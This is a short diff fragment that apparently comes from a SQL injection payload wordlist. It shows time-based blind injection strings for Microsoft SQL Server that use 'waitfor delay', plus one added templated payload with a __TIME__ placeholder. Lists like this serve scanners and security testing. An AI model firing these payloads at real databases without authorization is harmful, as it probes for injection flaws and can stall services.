@@ -7,3 +7,4 @@
 '; waitfor delay '0:30:0'--
 1;waitfor delay '0:30:0'--
 (",)')(,((
+));waitfor delay '0:0:__TIME__'--
